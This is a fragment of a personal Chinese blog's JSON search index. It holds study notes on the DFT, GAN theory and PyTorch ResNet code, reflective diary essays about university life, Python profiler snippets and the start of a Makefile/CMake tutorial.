","date":"2022-10-17T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/cv/vit/","title":"ViT"},{"content":"DFT 定义\n$$ X[k] = \\sum_{n=0}^{N-1}x[n] e^{-j2\\pi\\frac{nk}{N}} = \\sum_{n=0}^{N-1}x[n]W_{N}^{nk} $$ 单位根表示\n$$ W_{N}^k = e^{-j2\\pi\\frac{k}{N}} $$\n $N$代表将单位圆平均分成的份数，$k$则相当于旋转的次数。整体上可以看成一个绕原点进行顺时针旋转的单位向量。\n DFT vs DTFT\n$$ X(\\omega)|_{\\omega=2\\pi\\frac{k}{N}} = X[k] $$\nIDFT\n$$ x[r]=\\frac{1}{N}\\sum_{k=0}^{N-1}X[k]e^{j2\\pi\\frac{rk}{N}} $$\n性质\n共轭：$ {\\rm DFT}{x^{\\ast}[n]} = X^{\\ast}[N-k] $\n（时域共轭，频域共轭+循环反转）\n反转：${\\rm DFT}{x[((-n))_N]}=X[((-k))_N]R_N[k]$\n（时域循环反转，频域循环反转）\n对称：${\\rm DFT}{\\Re{x[n]}}=X_e[k]$ ${\\rm DFT}{j\\Im{x[n]}}=X_o[k]$ $\\Re{X[k]}={{\\rm DFT} {x_e[n]}}$ $j\\Im{X[k]}={{\\rm DFT} {x_o[n]}}$\n（推论：实序列的DFT共轭偶对称，即 $X[k] = X^{*}[N-k]$ ）\n对偶：${\\rm DFT}{X[k]}=Nx[((-n))_N]R_N[n]$\n（直观理解：DFTMatrix的$N-k$行和IDFTMatrix的$k$行相同，如果不考虑系数）\n循环位移：${\\rm DFT}{x[((n-m))_N]R_N[n]} = W_N^{mk}X[k]$\n（DTFT的位移变成了DFT的循环位移，$m$理论上可以取非整数）\n循环卷积：${\\rm IDFT}{X[k]Y[k]}=\\sum_{m=0}^{N-1}x[m]y[((n-m))_N]$\n（把传统线性卷积的反转+位移变为循环反转+循环位移。时域理解：将有限序列进行周期延拓后，形成以$N$为周期的序列，在主值区间上进行线性卷积 频域理解：线性卷积以$N$为周期进行混叠后，在$[0,N-1]$截断）\n保范：$\\sum_{n=0}^{N-1}|x[n]|^2=\\frac{1}{N}\\sum_{k=0}^{N-1}|X[k]|^2$\n 补充定义\n循环位移：$ x[((n-m))_N]R_N[n] $ (移位+截断，$m$为向右平移的位数)\n循环反转：$x[((-n))_N]R_N[n]$ (0不变，其余前后反转)\n共轭偶/奇对称：$x_{e/o}[n] = \\frac{1}{2}(x[n]\\pm x^{\\ast}[((-n))]R_N[n])$ (注意把原来的取反变成了循环反转)\n ","date":"2022-10-13T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/digital_signal_processing/dft/","title":"DFT"},{"content":"method GAN分为两个基本部分：discriminator和generator。discriminator的输入为train data和fake data(distribution)，输出为data True/False的概率分布；generator的输入为random noise，输出为fake data。\nGAN的一轮训练基本流程如下：\n fix generator \u0026amp; update discriminator:  fix discriminator \u0026amp; update generator:  这样迭代若干轮，generator就可以获得不错的生成效果。\ntheory GAN的优化目标是什么？考虑一个随机分布$x$，在经过generator $G$之后的分布为$P_G=G(x)$。而真实的data $data$经过generator $G$之后的分布为$P_{data}=G(data)$。我们的优化目标是$P_G=P_{data}$，或者： $$ G^* = \\arg \\min_G Div(P_G,P_{data}) $$ 由于$D$的本质是一个二分类训练器，我们定义损失函数$V(G,D)$（BCEloss）： $$ V(G,D)=E_{y-P_{data}}[\\log D(y)]+E_{y-P_G}[\\log(1-D(y))] $$ 理想状况是，$D$倾向于将真实样本预测为正例，将生成样本预测为负例。这样我们要将$V(G,D)$最大化： $$ D^*=\\arg \\max_D V(D,G) $$ 两个优化阶段实际上是有联系的：当第一阶段的$Div$较小时，$D$较难分辨样本，反之则容易分辨样本。\n注意到$D$可以直接计算两种数据之间的$Div$。这样我们将$G$的优化函数改写如下： $$ G^*=\\arg \\min_G \\max_D V(G,D) $$ 这个式子的含义是：生成器不断优化使得判别器准确率降低。\n这里衡量GAN用到了散度的概念。传统深度学习（如知识蒸馏）多使用$\\rm KL$散度： $$ KL(p||q) = -\\int p(x)\\ln \\frac{q(x)}{p(x)}dx $$ 但$\\rm KL$散度的一个缺点是不对称，于是我们定义$\\rm JS$散度： $$ JS(p||q) = KL(p||\\frac{p+q}{2}) + KL(q||\\frac{p+q}{2}) $$\nGAN以难以训练闻名。但其全局最优解是可知的，我们需要从数学上证明这两点：\n  对于任意给定的$G$，我们可以找到最优的判别器$D_G^∗$；\n结论 $D_G^*(x)=\\frac{p_{data}(x)}{p_{data}(x)+p_G(x)}$\n  对于全局最优的$G^∗$，我们希望它生成数据的分布和真实样本的分布一致，即$P_G=P_{data}$ 。\n结论 当且仅当$p_G(x)=p_{data}(x)$时，我们才能得到$G$的全局最优解。\n  详细的证明见GAN详解\n根据上述证明过程可以得出$G^=\\arg \\min_G \\max_D V(G,D)$在最佳判别器$D_G^$的优化目标$C(G)=V(G,D_G^*)$可以写作： $$ C(G) = -\\log(4)+2·JS(p_{data}(x)||p_{G}(x)) $$ 当$p_G(x)=p_{data}(x)$时，$C(G)$取得全局最优解$-\\log4$。\nother 在基础版本的GAN中，模型输入的是随机分布。而当我们同时输入限定条件时，就得到了conditinal GAN。\n而使用不同风格的unpaired data，我们也可以实现风格迁移。比如我们需要实现$\\mathcal{X}$ domain到$\\mathcal{Y}$ domain的转换，generator $G_{x\\rightarrow y}$负责风格转换，discriminator $D_{y}$负责判断真实的和虚假的$\\mathcal{Y}$集。\n但这会导致一个问题：我们如何判断风格的迁移是否符合预期？为此，我们引入一个新的generator $G_{y\\rightarrow x}$，判断生成的$\\mathcal{X}$集是否与原本的$\\mathcal{X}$集相似。为了进一步增强效果，我们还可以新引入一个$D_x$来增强效果，这就是Cycle GAN的效果：\n","date":"2022-10-09T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/free-learning/gan/","title":"GAN"},{"content":"Resnet method Resnet引入了所谓残差连接的思想：对于每一个层，我们要学习的不是$\\mathcal{H}(x)$，而是$\\mathcal{F}(x) = \\mathcal{H}(x) - x$。换句话讲，我们不需要再学之前层学过的东西，而是要学两者的差距。\n注意Resnet在连接时，存在两种不同的连接方式： $$ y = \\mathcal{F}(x,{W_i})+x \\ $$\n$$ y = \\mathcal{F}(x,{W_i})+W_sx $$\n当跨越维度连接时，有两种可选方案来解决维度不适配的问题：1) 补0 2)投影。消融实验表明，这两种方法对结果没有本质影响。\n不同的Resnet配置如下：\ncode BasicBlock 见resnet.py。\nResnet提供了两种原版结构：BasicBlock和BottleNeck。此处不再深究两者的区别，以默认的BasicBlock为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  class BasicBlock(nn.Module): expansion = 1 def __init__(self, inplanes, planes, stride=1, downsample=None, groups=1, base_width=64, dilation=1, norm_layer=None): super(BasicBlock, self).__init__() if norm_layer is None: norm_layer = nn.BatchNorm2d if groups != 1 or base_width != 64: raise ValueError(\u0026#39;BasicBlock only supports groups=1 and base_width=64\u0026#39;) if dilation \u0026gt; 1: raise NotImplementedError(\u0026#34;Dilation \u0026gt; 1 not supported in BasicBlock\u0026#34;) # Both self.conv1 and self.downsample layers downsample the input when stride != 1 self.conv1 = conv3x3(in_planes=inplanes, out_planes=planes, stride=stride) self.bn1 = norm_layer(planes) self.relu = nn.ReLU(inplace=True) self.conv2 = conv3x3(planes, planes) self.bn2 = norm_layer(planes) self.downsample = downsample self.stride = stride def forward(self, x): identity = x out = self.conv1(x) out = self.bn1(out) out = self.relu(out) out = self.conv2(out) out = self.bn2(out) if self.downsample is not None: identity = self.downsample(x) # residual connection out += identity out = self.relu(out) return out   每一个BasicBlock对应的是这样一个模块：\n其__init__参数中的inplanes和planes分别指代input channel和output channel，一个简单示例如下：\n1 2 3 4 5 6 7 8 9  \u0026gt;\u0026gt; basicblockimpl = BasicBlock(64, 128) \u0026gt;\u0026gt; print(basicblockimpl) BasicBlock( (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) )   其forward部分如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  def forward(self, x): identity = x out = self.conv1(x) out = self.bn1(out) out = self.relu(out) out = self.conv2(out) out = self.bn2(out) if self.downsample is not None: identity = self.downsample(x) # residual connection out += identity out = self.relu(out) return out   注意到其中的残差连接部分。值得注意的是，为了进行维度匹配，forward中还存在self.downsample部分，是一个channel维度不匹配的二维卷积。之后在Resnet的解释中会详细说明：\n1 2 3 4  (downsample): Sequential( (0): Conv2d(256, 512, kernel_size=(1, 1), stride=(2, 2), bias=False) (1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) )   Resnet 观察其forward函数，我们逐个分析其中的模块：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  def _forward_impl(self, x): # [2, 3, 224, 224] x = self.conv1(x) # [2, 64, 112, 112] x = self.bn1(x) x = self.relu(x) x = self.maxpool(x) # [2, 64, 56, 56] x = self.layer1(x) # [2, 64, 56, 56] x = self.layer2(x) # [2, 128, 28, 28] x = self.layer3(x) # [2, 256, 14, 14] x = self.layer4(x) # [2, 512, 7, 7] x = self.avgpool(x) # [2, 512, 1, 1] x = torch.flatten(x, 1) # [2, 512] x = self.fc(x) # [2, 1000] return x   self.conv1(x)使用7x7卷积核，将图片的channel从3变为64，同时特征图长宽缩短一半。\n1  (conv1): Conv2d(3, 64, kernel_size=(7, 7), stride=(2, 2), padding=(3, 3), bias=False)     self.maxpool(x)将特征图长宽再缩短一半。\n1  (maxpool): MaxPool2d(kernel_size=3, stride=2, padding=1, dilation=1, ceil_mode=False)     之后是模块的主体部分：\n1 2 3 4 5 6 7  self.layer1 = self._make_layer(block, 64, layers[0]) self.layer2 = self._make_layer(block, 128, layers[1], stride=2, dilate=replace_stride_with_dilation[0]) self.layer3 = self._make_layer(block, 256, layers[2], stride=2, dilate=replace_stride_with_dilation[1]) self.layer4 = self._make_layer(block, 512, layers[3], stride=2, dilate=replace_stride_with_dilation[2])   首先看这4个层中共有的特征：64/128/256/512是输出通道数，layers[i]是通道的层数。\n注意到layer1和其它模块参数的不同之处：无stride。这决定了：\n 每一个layer第一个BasicBlock的状态：  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ## layer 1 (0): BasicBlock( (conv1): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) ## layer 2 (0): BasicBlock( (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (downsample): Sequential( (0): Conv2d(64, 128, kernel_size=(1, 1), stride=(2, 2), bias=False) (1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) )   第一个layer用于缩小特征图和增加channel数（stride=1时除外）。其它的layer保持特征图的尺寸不变。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  layers = [] layers.append(block(self.inplanes, planes, stride, downsample, self.groups, self.base_width, previous_dilation, norm_layer)) self.inplanes = planes * block.expansion for _ in range(1, blocks): layers.append(block(self.inplanes, planes, groups=self.groups, base_width=self.base_width, dilation=self.dilation, norm_layer=norm_layer)) (layer2): Sequential( (0): BasicBlock( (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (downsample): Sequential( (0): Conv2d(64, 128, kernel_size=(1, 1), stride=(2, 2), bias=False) (1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) ) (1): BasicBlock( (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) (2): BasicBlock( (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) (3): BasicBlock( (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) )   是否含有downsample层：  1 2 3 4  downsample = nn.Sequential( conv1x1(self.inplanes, planes * block.expansion, stride), norm_layer(planes * block.expansion), )   当跨层进行残差连接时，可能会出现维度不匹配的问题，这时候需要进行downsampling以使得维度匹配：\n1 2 3  out: torch.Size([2, 128, 28, 28]) in before: torch.Size([2, 64, 56, 56]) in after: torch.Size([2, 128, 28, 28])   self.avgpool所使用的是torch.nn.AdaptiveAvgPool2d，使用时只需要指定最后两维的尺寸(H_0, W_0)即可。\nself.fc将图片分为1000类。\n最后我们对模型的使用做一个总结（以resnet34为例）：\n1 2 3 4  def resnet34(pretrained=False, progress=True, **kwargs): return _resnet(\u0026#39;resnet34\u0026#39;, BasicBlock, [3, 4, 6, 3], pretrained, progress, **kwargs) # layer1~4\u0026#39;s depth is 3,4,6,3   1 2 3 4  resnet34impl = resnet34() img = torch.randn([2, 3, 224, 224]) out = resnet34impl(img) print(out.shape) # [2, 1000]   ","date":"2022-10-09T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/cv/resnet/","title":"ResNet"},{"content":"小黑前传的名字叫作《追忆似火年华》，不过小黑后传似乎和“似火”并不怎么沾边，索性就叫小黑后传好了，以后有想法再更新一个文艺点的标题。\n一 2022.6.19 考完试的第一天。\n“您当日的听歌时间为8h42min，位居好友榜榜首，恭喜！”\n虽然知道自己网抑云的习惯由来已久（确切地来讲，网易云和QQ音乐都听，而且QQ更多一些），但看到这个数字小黑还是震惊了一下的。其他人排解心魔的方式有社交、有读书、也有游戏，小黑则是网抑云，嗯网抑云。\n小黑的听歌方式，比较奇怪。他不怎么关注日推，也不会从500多首红心中随机抽取音乐，而是这样的：在一个特定的时间段里，他会对歌单里的5~10首歌进行单曲循环，如果在这期间搜罗到了什么好音乐，单曲循环的队列就会被更新。\n 从这个角度讲，这种听歌机制其实很像计算机里面cache的原理——平时单曲循环的歌存在cache里，适当的时候从主存里加载歌曲到cache里再单曲循环\u0026hellip;\n 从这个听歌习惯，似乎也能看到小黑的一点习惯——或者更确切的说，叫秉性——念旧、保守\u0026hellip;\u0026hellip;\n小黑摇了摇头，网抑云不是这么抑的。不过说起来，这个习惯是怎么形成的？\n二 2022.5.22 小黑居然在大二下学期中刷完了一部番，不过是老番，也比较短——《新世纪福音战士》。\n男主似乎和小黑有不少共同点——弱不禁风，胆小，喜欢边喝着酒/饮料边瘫坐着听音乐。\n这里要特别说一下“边喝着酒/饮料边瘫坐着听音乐”，小黑在看到这些镜头时，竟然前所未有地产生了共鸣感——比起那种激励人奋进的鸡汤，小黑似乎对这样的状态更加向往。\n男主有一段台词让他十分印象深刻：\n 你总是逃避自己讨厌的事情。\n我已经很努力地再试了！\n这有什么不好！\n逃避讨厌的事情又有什么不对！\n 小黑感觉自己也在逃避，逃避的是什么？也许不只是眼前的困难——就像科研进度十分缓慢，小黑第一反应想的不是调整状态，多看几篇论文和代码，而是打开手机看eva——美其名曰寻找与自己和解的路子。\n从那以后，耳机便真的成了小黑的耳旁常伴的物品了。\n小黑更想逃避的，也许是真实的自己、阴暗的自己。不过，小黑是什么时候开始思考这些问题的呢？\n三 2022.4.12 这场不大不小的折磨终于结束了。\n身体的折磨是暂时结束了。不过从那以后，小黑似乎就变了一个人——头脑中无用的精神内耗开始变多，头脑里就好像有两个不同的政党在打架，最后也给不出什么具体的执行方案来，生活就这样原地踏步地进行着。\n这造成的直接后果就是：睡眠质量严重下降，上课难以集中精神，科研开始摆烂\u0026hellip;\u0026hellip;不过有一点，小黑始终认为，自己并没有失去对学习的兴趣，只是暂时失去了自己的方向。\n说起方向，小黑有过自己真正的方向吗？从某种意义上，小黑在战略决策上似乎从来只是一株墙头草——小黑从小到大，或者更确切地说，是进了大学之后，努力的出发点就只是“我想成为xxx那样的人”——A的笔记，B的钻研，C的个人魅力\u0026hellip;\u0026hellip;这本是一件好事，但小黑发现自己似乎哪一个人都变不成，而当别人告诉自己要“做自己”时，小黑甚至连“自我”的定义都难以下达——自己追寻了太多别人的足迹，却连自己本来的样子都忘记了。\n那么，自己到底想成为什么样的人？这要从一次谈话说起。\n四 2022.1.18 在入学前，小黑给自己的label是：社恐分子、小镇做题家、局外人。\n一年半后，小黑给自己的label是：孤勇者、想要成为文艺青年的理工男、安静、内向，自己将会在学习和科研的路上一路狂奔。\n但，果真如此吗？\n我与老友聊起了关于自身的定位问题，老友说：其实你一直是一个很有人情味的人，并列举种种事例。\n这时小黑才意识到，自己的内心中，本质上有很多感性的成分。自己也渴望社交、渴望沟通、渴望人与人之间微妙的联结——而不是仅仅一味扎进学术中。\n \u0026ldquo;人有种奇怪的虚荣心，想让别人或自己相信他向往的是真理，但其实他有求于这个世界的是爱。\u0026ldquo;加缪一语道破天机。\n 自己的一些label，似乎硬生生束缚住了自己的手脚。本我，似乎与展现在世人面前的我，以及小黑所期望的我，出现了前所未有的参差。它们相互交织，却又在触及人心最柔软的部分互斥。\n小黑原本以为自己的这些label大概是在高中时期形成的。但另一位老友给了他一个惊人的答案：\n 小学。\n 五 2022.8.4 递归似地分析完了所有问题，接下来要做的，就是要把所有问题层层出栈。只是，这样的思索是存在精确解的吗？如果没有，那这样的思索是无谓的吗？正如小黑不顾繁重的任务和压力，在深夜敲下废话连篇的意识流文章一样，此举意义何在？\n什么才能治好小黑的精神内耗？这个学期的经历似乎告诉小黑：不是忙碌，更不是让自己的身心投入到学习和工作中。\n那是什么？也许是慢慢地与留下太多遗憾地自己和解。但和解的过程，又何尝不是一个精神内耗的过程。\n小黑似乎又一次掉入了无限的递归之中。\n","date":"2022-08-04T01:09:43+08:00","permalink":"https://ther-nullptr.github.io/posts/small_talk/%E5%B0%8F%E9%BB%91%E5%90%8E%E4%BC%A0/","title":"小黑后传"},{"content":" “我们前后找了几十年以来的毕业生，在十六万人中分析了五百人，得到了结论。结果发现很多结果出乎清华校方的意料。 比如，我们分析了成绩因素，按理说成绩好应该更成功吧？但结果是，成绩对以后的发展并没有影响，就是说，成绩好并不代表发展好，当然也不可能发展差对吧。这是很出乎校方意料的一点。 那社工呢？大家都认为如果做了什么学生会主席、社会工作可能对未来发展有所帮助，结果还是没有关系。没有关系意思是有没有这些优势都不影响以后发展。 那么家庭影响应该足够重要了吧，比如有的家长眼界很高，有先进的观念，培养孩子很有方法，这是个影响因素吗？不是。 地域呢？比如有的同学来自偏远地区，有的在大城市，这是影响因素吗？不是。这些都不是，那我们发现了什么呢？ 我们在二十多个因素里，唯一发现很多人都具有的一个共同点就是，他们都很早地开始思考自己的未来并且着手做准备。\n ","date":"2022-07-28T02:11:43+08:00","permalink":"https://ther-nullptr.github.io/posts/small_talk/review/","title":"试错，还是错逝？"},{"content":"“失去的二十周” 2022.1.21  “泡沫的顶峰”\n 2022.3.1  “出校理由：北医三院” “原因玄学，大学生，压力大，作息不规律，有心理因素，正常”\n 2022.3.8  “这就是世一大的教学水平吗” 自己的“看家本领”到底是什么？？\n 2022.4.10  第一次大寄\n 2022.4.17  “所以，你们到底做了些什么？”\n 2022.4.23  “搞了半天，还是咱不够卷\u0026hellip;”\n 2022.4.26  第二次大寄 “一段噩梦的结束” “人是会在同一个地方摔两次跟头的”\n 2022.4.28  “今后还会像这般心想事成吗？”\n 2022.4.30  “至少到现在这个阶段我觉得，我看到一个很强的人时，我会这样想：‘我虽然崇拜他，但我并不会说去完全变成他的样子，而只是在想怎么做好自己’” “很遗憾，我目前还做不到这一点”\n 2022.5.2  “残酷な天使のように，少年よ神话になれ！”\n 2022.5.3  一个并不光彩的W\n 2022.5.4  “突然感觉，你清学子要花费很多时间在‘与自己和解’上”\n 2022.5.17  “大家并不是真的有多反感封校和防疫，他们只是想借此机会抒发各自心中的不快罢了”\n 2022.5.23  “千载难逢的机会，你不用吗？” “算了，我怕有后续影响”\n 2022.6.8  “好多人都在讲好大学平台有多好，但是鄙人感觉这个平台并不属于只会埋头干活的人。。”\n 2022.6.12  “有时候选择比努力更重要，以后在社会上更是这样，这也许是这魔幻的一学期带给我们的启示吧”\n 2022.6.14  C楼3层，一个全新的世界\n 2022.6.20  “在一个弱一点的985如果能一开始处于前列，那么你的学习动能是强于在清北挣扎的，是一个向上走的趋势，而且会进入大佬圈子，拿到本校顶尖的资源和信息共享；而清北学渣什么都没有，四年一直走下坡路。这一上一下差距会拉得很大。”\n 2022.6.25  “这他妈就是一个强者恒强的过程。。。”\n So where is the way? ","date":"2022-07-27T23:59:43+08:00","permalink":"https://ther-nullptr.github.io/posts/small_talk/%E6%97%A5%E5%AF%84/","title":"日寄"},{"content":"line_profiler 可逐行分析代码的占用时间情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #!/usr/bin/env python import requests from bs4 import BeautifulSoup # 这个装饰器会告诉行分析器  # 我们想要分析这个函数 @profile def get_urls(): response = arequests.get(\u0026#39;https://www.csdn.net/\u0026#39;) s = BeautifulSoup(response.content, \u0026#39;lxml\u0026#39;) urls = [] for url in s.find_all(\u0026#39;a\u0026#39;): urls.append(url[\u0026#39;href\u0026#39;]) if __name__ == \u0026#39;__main__\u0026#39;: get_urls()   memory_profiler 可以分析代码占用内存的情况。\n1 2 3 4 5 6 7 8 9 10 11  from memory_profiler import profile @profile def my_func(): a = [1] * (10 ** 6) b = [2] * (2 * 10 ** 7) del b return a if __name__ == \u0026#39;__main__\u0026#39;: my_func()   ","date":"2022-07-17T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/python-profilers/","title":"Python Profilers"},{"content":"选方向（包括但不限于进组 推研等）这件事，本质上和找伴侣是一样的。\n一开始的时候，大家都盯着最好的方向跃跃欲试，就像大家对着女神心存好感一样。\n就像不是每个人都能拥有女神一样，不是每个人都能去最心仪的方向——有些人会找一个普通但适合自己的组随遇而安，而有些人卷破脑袋想进最好的组。然而他们最后会发现一个悲哀的事实：别人可以获得组里（女神）的垂青而你不能，并不是因为你比别人更卷（在追女神上更下功夫），而是人家的先天条件本来就比你强。有些人在卷的过程中领悟到了这些事实而选择退却，而有些人干脆一开始就看破红尘选择躺平。当然，也有人选择不去尝试——这未免不愚蠢，毕竟尝试不同的方向花费的成本，要远小于你追女神花费的成本。\n而后，正如你的第一任心动大概率不会和你步入婚姻殿堂一样，你的第一段经历也不一定会成为你日后主攻的方向，但至少它们却聊胜于无——往坏里讲，它们都会让你认识到自己的渺小；往好里讲，它们都能让你深刻思考自己想要成为什么样的人。\n好的资源终归是有限的。兴趣与事业，爱情与婚姻，大概率不会是平行的（好在一般也不是正交的）。多少年后，当你从事的不是你年少时为之着迷的方向，当你和你的怦然心动渐行渐远时，你是否又能保有对事业的热情，和对TA的激情？不过，干一行爱一行，也算是学术人的责任与操守吧。选方向（包括但不限于进组 推研等）这件事，本质上和找伴侣是一样的。\n一开始的时候，大家都盯着最好的方向跃跃欲试，就像大家对着女神心存好感一样；而就像不是每个人都能拥有女神一样，不是每个人都能去最心仪的方向——有些人会找一个普通但适合自己的组随遇而安，而有些人卷破脑袋想进最好的组。然而他们最后会发现一个悲哀的事实：别人可以获得组里（女神）的垂青而你不能，并不是因为你比别人更卷（在追女神上更下功夫），而是人家的先天条件本来就比你强。有些人在卷的过程中领悟到了这些事实而选择退却，而有些人干脆一开始就看破红尘选择躺平。当然，也有人选择不去尝试——这未免不愚蠢，毕竟尝试不同的方向花费的成本，要远小于你追女神花费的成本。\n而后，正如你的第一任心动大概率不会和你步入婚姻殿堂一样，你的第一段经历也不一定会成为你日后主攻的方向，但至少它们却聊胜于无——往坏里讲，它们都会让你认识到自己的渺小；往好里讲，它们都能让你深刻思考自己想要成为什么样的人。\n好的资源终归是有限的。兴趣与事业，爱情与婚姻，大概率不会是平行的（好在一般也不是正交的）。多少年后，当你从事的不是你年少时为之着迷的方向，当你和你的怦然心动渐行渐远时，你是否又能保有对事业的热情，和对TA的激情？不过，干一行爱一行，也算是学术人的责任与操守吧。\n","date":"2022-06-24T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/small_talk/%E6%AE%8A%E9%80%94%E5%90%8C%E5%BD%92/","title":"殊途同归"},{"content":"Makefile \u0026amp; CMake 想象一下我们有如下C++程序hello.cpp：\n1 2 3 4 5  #include \u0026lt;iostream\u0026gt;int main() { std::cout \u0026lt;\u0026lt; \u0026#34;hello world!\u0026#34; \u0026lt;\u0026lt; std::endl; }   我们需要在终端输入以下指令：\n1  $ g++ hello.cpp -o hello   这时我们就可以生成可执行文件hello。但在实际应用场景中，我们可能会面临如下问题：\n 项目中的.h文件和.cpp文件十分繁多。 各.h文件、.cpp文件的依赖关系十分复杂。 多文件可能会出现重复编译的情况，拖慢编译速度。 \u0026hellip;  为了解决这些问题，makefile和CMake应运而生。\n本讲需要使用到的工具：g++，make，cmake。可以通过以下方式安装：\n1  $ sudo apt-get install g++ make cmake   Makefile makefile文件描述了C/C++工程的编译规则，可以用来指明源文件的编译顺序、依赖关系、是否需要重新编译等，自动化编译C/C++项目（实际上也不止局限于C/C++项目）。\n我们可以考虑以下实例：\n1 2 3 4 5  . ├── invsqrt.cpp ├── invsqrt.h ├── main.cpp └── makefile   makefile如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  CXXFLAGS = -std=c++17 -O2 main: main.o invsqrt.o $(CXX) $(CXXFLAGS) -o $@ $^ main.o: main.cpp invsqrt.h $(CXX) $(CXXFLAGS) -o $@ -c $\u0026lt; invsqrt.o: invsqrt.cpp invsqrt.h $(CXX) $(CXXFLAGS) -o $@ -c $\u0026lt; .PHONY: clean clean: rm main.o invsqrt.o main   我们不需要理解每一段代码的具体含义（之后我们可以看到，我们不需要手动编写makefile，而可以直接通过CMake工具生成makefile），我们只需要了解如何使用makefile：\n 在makefile的同目录下输入make，就可以按照makefile所指定的编译规则自动编译整个工程。 在makefile的同目录下输入make clean，可以删除编译生成的中间文件和可执行文件。 除此之外，你还可以为makefile添加更多指令，此处由于篇幅所限，不再展开介绍。  CMake makefile存在以下问题：\n 语法复杂，代码可读性差，难以维护。 跨平台性差。  在目前的C++工程中，我们多使用CMake来管理项目。\n什么是CMake？CMake是一种跨平台的编译工具，可以用较为简洁易读的语法描述C++项目的编译、链接、安装过程等，在现代C++项目上得到了广泛应用。\n1 第一个CMake项目 CMake的项目文件叫做CMakeLists.txt。其放置位置如下图所示：\n1 2  ├── CMakeLists.txt └── main.cpp   该项目的CMakeLists.txt中需要添加以下内容：\n1 2 3  cmake_minimum_required(VERSION 3.5)project (hello_world)add_executable(hello_world main.cpp)   语法总结1\n cmake_minimum_required(VERSION 3.5) CMake需要的最小版本。CMake的版本可以在命令行中输入cmake --version获取，一般无强制要求。 project(\u0026lt;project_name\u0026gt;) 指定工程名称。 add_executable(\u0026lt;executable_name\u0026gt; \u0026lt;cppfile_name\u0026gt;) 生成可执行文件。   cmake工具的使用一般分为两步 1) 使用CMakeLists.txt生成makefile。 2) 使用makefile自动化编译项目。\n 输入cmake CMakeLists.txt，目录下将会生成一个Makefile文件。 输入make，即可将源代码编译生成可执行文件。此处将会在与CMakeLists.txt相同目录的位置生成一个可执行文件hello_word，输入./hello_word即可运行该可执行文件。 此外，输入make help，你也可以查看使用当前的Makefile所能执行的所有指令，例如make clean（清楚生成的可执行文件和中间文件）。  2 多文件 在平时的程设小作业中，我们习惯将所有的代码都写在一个.cpp文件中。但在实际工程中，为了方便代码复用和运行维护，通常将所有的文件划分为头文件(.h)，模块文件(.cpp)和主程序文件(.cpp)。\n在本节中，我们将在头文件中声明一个计算平方根倒数的函数，在模块文件中实现其主体，然后在主函数中调用它。项目结构如下：\n1 2 3 4 5 6 7  . 